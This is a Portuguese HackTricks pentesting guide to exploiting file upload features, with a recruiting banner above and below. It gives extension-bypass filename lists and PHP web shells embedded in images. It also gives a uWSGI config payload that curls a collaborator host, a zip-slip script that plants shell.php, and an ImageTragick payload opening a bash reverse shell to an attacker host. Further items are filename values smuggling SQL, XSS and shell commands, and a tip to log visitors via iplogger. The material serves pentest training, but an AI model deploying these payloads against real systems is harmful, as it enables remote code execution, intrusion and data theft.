# File Upload

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em **carreira de hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

## Metodologia Geral de Upload de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Trabalhando em PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass de verificações de extensões de arquivo

1. Se aplicável, **verifique** as **extensões anteriores.** Teste-as também usando algumas **letras maiúsculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionando uma extensão válida antes** da extensão de execução (use também as extensões anteriores):_
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar o Burp para **bruteforce** todos os **caracteres ascii** e **Unicode**. (_Note que você também pode tentar usar as **extensões** mencionadas **anteriormente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções **enganando o parser de extensão** do lado do servidor com técnicas como **duplicar** a **extensão** ou **adicionar dados lixo** (**bytes nulos**) entre as extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** à verificação anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão exec antes da extensão válida** e reze para que o servidor esteja mal configurado. (útil para explorar configurações incorretas do Apache onde qualquer coisa com extensão **_**.php**_**, mas** não necessariamente terminando em .php** executará código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** no **Windows**. Nesse caso, um caractere de dois pontos “:” será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (por exemplo, “file.asax:.jpg”). Este arquivo pode ser editado mais tarde usando outras técnicas, como usar seu nome de arquivo curto. O padrão “**::$data**” também pode ser usado para criar arquivos não vazios. Portanto, adicionar um caractere de ponto após esse padrão também pode ser útil para contornar mais restrições (por exemplo, “file.asp::$data.”)
8. Tente quebrar os limites do nome do arquivo. A extensão válida é cortada. E o PHP malicioso é deixado. AAA<--SNIP-->AAA.php

```
# Linux máximo 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ab3Ab4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # menos 4 aqui e adicionando .png
# Faça o upload do arquivo e verifique a resposta quantos caracteres ele permite. Vamos supor 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Faça o payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compressão & Redimensionamento

- Bypass **Content-Type** verificações definindo o **valor** do **header** **Content-Type** para: _image/png_, _text/plain_, application/octet-stream_
1. Lista de palavras do Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **verificação de magic number** adicionando no início do arquivo os **bytes de uma imagem real** (confundir o comando _file_). Ou introduza o shell dentro dos **metadados**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou você também poderia **introduzir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressões estão sendo adicionadas à sua imagem**, por exemplo, usando algumas bibliotecas PHP padrão como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as técnicas anteriores não serão úteis. No entanto, você poderia usar o **chunk PLTE** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviva à compressão**.
- [**Github com o código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- A página da web também pode estar **redimensionando** a **imagem**, usando por exemplo as funções PHP-GD `imagecopyresized` ou `imagecopyresampled`. No entanto, você poderia usar o **chunk IDAT** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviva à compressão**.
- [**Github com o código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Outra técnica para fazer um payload que **sobrevive a um redimensionamento de imagem**, usando a função PHP-GD `thumbnailImage`. No entanto, você poderia usar o **chunk tEXt** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviva à compressão**.
- [**Github com o código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Outras Dicas para verificar

- Encontre uma vulnerabilidade para **renomear** o arquivo já enviado (para mudar a extensão).
- Encontre uma vulnerabilidade de **Inclusão de Arquivo Local** para executar o backdoor.
- **Possível divulgação de informações**:
1. Faça o upload **várias vezes** (e ao **mesmo tempo**) do **mesmo arquivo** com o **mesmo nome**
2. Faça o upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
3. Fazendo upload de um arquivo com **“.”, “..”, ou “…” como seu nome**. Por exemplo, no Apache em **Windows**, se a aplicação salvar os arquivos enviados no diretório “/www/uploads/”, o nome de arquivo “.” criará um arquivo chamado “uploads” no diretório “/www/”.
4. Faça o upload de um arquivo que pode não ser facilmente excluído, como **“…:.jpg”** em **NTFS**. (Windows)
5. Faça o upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` em seu nome. (Windows)
6. Faça o upload de um arquivo no **Windows** usando **nomes reservados** (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Tente também **fazer upload de um executável** (.exe) ou um **.html** (menos suspeito) que **executará código** quando acidentalmente aberto pela vítima.

### Truques especiais de extensão

Se você está tentando fazer upload de arquivos para um **servidor PHP**, [dê uma olhada no truque **.htaccess** para executar código](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Se você está tentando fazer upload de arquivos para um **servidor ASP**, [dê uma olhada no truque **.config** para executar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os `.jar` para java, mas para php, e podem ser **usados como um arquivo php** (executando-o com php, ou incluindo-o dentro de um script...)

A extensão `.inc` é às vezes usada para arquivos php que são apenas usados para **importar arquivos**, então, em algum momento, alguém poderia ter permitido **que essa extensão fosse executada**.

## **Jetty RCE**

Se você puder fazer upload de um arquivo XML em um servidor Jetty, você pode obter [RCE porque **novos \*.xml e \*.war são processados automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Então, como mencionado na imagem a seguir, faça o upload do arquivo XML para `$JETTY_BASE/webapps/` e espere pelo shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Para uma exploração detalhada dessa vulnerabilidade, verifique a pesquisa original: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Execução Remota de Comando (RCE) podem ser exploradas em servidores uWSGI se alguém tiver a capacidade de modificar o arquivo de configuração `.ini`. Os arquivos de configuração do uWSGI utilizam uma sintaxe específica para incorporar variáveis "mágicas", marcadores de posição e operadores. Notavelmente, o operador '@', utilizado como `@(filename)`, é projetado para incluir o conteúdo de um arquivo. Entre os vários esquemas suportados no uWSGI, o esquema "exec" é particularmente potente, permitindo a leitura de dados da saída padrão de um processo. Esse recurso pode ser manipulado para fins nefastos, como Execução Remota de Comando ou Escrita/Leitura Arbitrária de Arquivo quando um arquivo de configuração `.ini` é processado.

Considere o seguinte exemplo de um arquivo `uwsgi.ini` prejudicial, mostrando vários esquemas:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante a análise do arquivo de configuração. Para que a configuração seja ativada e analisada, o processo uWSGI deve ser reiniciado (potencialmente após uma falha ou devido a um ataque de negação de serviço) ou o arquivo deve ser configurado para recarregar automaticamente. O recurso de recarregamento automático, se ativado, recarrega o arquivo em intervalos especificados ao detectar alterações.

É crucial entender a natureza flexível da análise do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (como uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

## **wget File Upload/SSRF Trick**

Em algumas ocasiões, você pode descobrir que um servidor está usando **`wget`** para **baixar arquivos** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando se a extensão dos arquivos baixados está dentro de uma lista de permissões para garantir que apenas arquivos permitidos sejam baixados. No entanto, **essa verificação pode ser contornada.**\
O **comprimento máximo** de um **nome de arquivo** em **linux** é **255**, no entanto, **wget** trunca os nomes dos arquivos para **236** caracteres. Você pode **baixar um arquivo chamado "A"\*232+".php"+".gif"**, esse nome de arquivo irá **contornar** a **verificação** (já que neste exemplo **".gif"** é uma **extensão válida**) mas `wget` irá **renomear** o arquivo para **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note que **outra opção** que você pode estar pensando para contornar essa verificação é fazer o **servidor HTTP redirecionar para um arquivo diferente**, assim a URL inicial contornará a verificação e então o wget fará o download do arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names`, porque **o wget fará o download da página redirecionada com o nome do arquivo indicado na URL original**.

## Ferramentas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) é uma ferramenta poderosa projetada para ajudar Pentesters e Caçadores de Bugs a testar mecanismos de upload de arquivos. Ela aproveita várias técnicas de bug bounty para simplificar o processo de identificação e exploração de vulnerabilidades, garantindo avaliações completas de aplicações web.

## De upload de arquivo a outras vulnerabilidades

- Defina **filename** como `../../../tmp/lol.png` e tente alcançar uma **traversal de caminho**
- Defina **filename** como `sleep(10)-- -.jpg` e você pode conseguir uma **injeção SQL**
- Defina **filename** como `<svg onload=alert(document.domain)>` para conseguir um XSS
- Defina **filename** como `; sleep 10;` para testar alguma injeção de comando (mais [truques de injeção de comando aqui](../command-injection.md))
- [**XSS** em upload de arquivo de imagem (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
- **Upload** de arquivo **JS** + **XSS** = [**exploração de Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
- [**XXE em upload de svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Redirecionamento Aberto** via upload de arquivo svg](../open-redirect.md#open-redirect-uploading-svg-files)
- Tente **diferentes payloads svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
- [Famosa vulnerabilidade **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se você puder **indicar ao servidor web para capturar uma imagem de uma URL**, você pode tentar abusar de um [SSRF](../ssrf-server-side-request-forgery/). Se essa **imagem** for **salva** em algum site **público**, você também pode indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informações de cada visitante**.
- [**XXE e CORS** contornados com upload de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
- PDFs especialmente elaborados para XSS: A [seguinte página apresenta como **injetar dados PDF para obter execução de JS**](../xss-cross-site-scripting/pdf-injection.md). Se você puder fazer upload de PDFs, pode preparar um PDF que executará JS arbitrário seguindo as indicações dadas.
- Faça upload do conteúdo \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar se o servidor possui algum **antivírus**
- Verifique se há algum **limite de tamanho** ao fazer upload de arquivos

Aqui está uma lista das 10 principais coisas que você pode conseguir ao fazer upload (de [aqui](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS armazenado / SSRF / XXE
3. **GIF**: XSS armazenado / SSRF
4. **CSV**: injeção CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : injeção HTML / XSS / redirecionamento aberto
8. **PNG / JPEG**: ataque de inundação de pixels (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / XXE CEGADO

#### Extensão Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Bytes de Cabeçalho Mágicos

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para outros tipos de arquivo.

### Upload de Arquivo Zip/Tar Descompactado Automaticamente

Se você puder fazer upload de um ZIP que será descompactado dentro do servidor, você pode fazer 2 coisas:

#### Symlink

Faça upload de um link contendo links simbólicos para outros arquivos, então, acessando os arquivos descompactados, você acessará os arquivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompactar em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompressão é um problema significativo. Apesar das suposições iniciais de que essa configuração poderia proteger contra a execução de comandos em nível de SO através de uploads de arquivos maliciosos, o suporte à compressão hierárquica e as capacidades de travessia de diretórios do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes contornem restrições e escapem de diretórios de upload seguros manipulando a funcionalidade de descompressão da aplicação alvo.

Um exploit automatizado para criar tais arquivos está disponível em [**evilarc no GitHub**](https://github.com/ptoomey3/evilarc). A utilidade pode ser usada conforme mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, o **truque de symlink com evilarc** é uma opção. Se o objetivo é direcionar um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado em seu sistema. Isso garante que o evilarc não encontre erros durante sua operação.

Abaixo está um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusando da compressão para file spraying**

Para mais detalhes **verifique o post original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Criando um Shell PHP**: O código PHP é escrito para executar comandos passados através da variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying e Criação de Arquivo Compactado**: Múltiplos arquivos são criados e um arquivo zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modificação com um Editor Hex ou vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um editor hex, mudando "xxA" para "../" para percorrer diretórios.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Carregue este conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (form do [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Incorporar um shell PHP no bloco IDAT de um arquivo PNG pode contornar efetivamente certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes neste contexto, pois são comumente usadas para redimensionar e reamostrar imagens, respectivamente. A capacidade do shell PHP incorporado de permanecer inalterado por essas operações é uma vantagem significativa para certos casos de uso.

Uma exploração detalhada dessa técnica, incluindo sua metodologia e potenciais aplicações, é fornecida no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreensão abrangente do processo e suas implicações.

Mais informações em: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Arquivos poliglotas servem como uma ferramenta única em cibersegurança, agindo como camaleões que podem existir validamente em múltiplos formatos de arquivo simultaneamente. Um exemplo intrigante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como um GIF quanto como um arquivo RAR. Esses arquivos não estão limitados a essa combinação; combinações como GIF e JS ou PPT e JS também são viáveis.

A utilidade central dos arquivos poliglotas reside em sua capacidade de contornar medidas de segurança que filtram arquivos com base no tipo. A prática comum em várias aplicações envolve permitir apenas certos tipos de arquivos para upload—como JPEG, GIF ou DOC—para mitigar o risco apresentado por formatos potencialmente prejudiciais (por exemplo, JS, PHP ou arquivos Phar). No entanto, um poliglota, ao se conformar aos critérios estruturais de múltiplos tipos de arquivos, pode contornar furtivamente essas restrições.

Apesar de sua adaptabilidade, os poliglotas enfrentam limitações. Por exemplo, enquanto um poliglota pode simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso de seu upload pode depender das políticas de extensão de arquivo da plataforma. Se o sistema for rigoroso quanto às extensões permitidas, a mera dualidade estrutural de um poliglota pode não ser suficiente para garantir seu upload.

Mais informações em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em **carreira em hacking** e hackear o inhackeável - **estamos contratando!** (_fluente em polonês escrito e falado é necessário_).

{% embed url="https://www.stmcyber.com/careers" %}

{{#include ../../banners/hacktricks-training.md}}
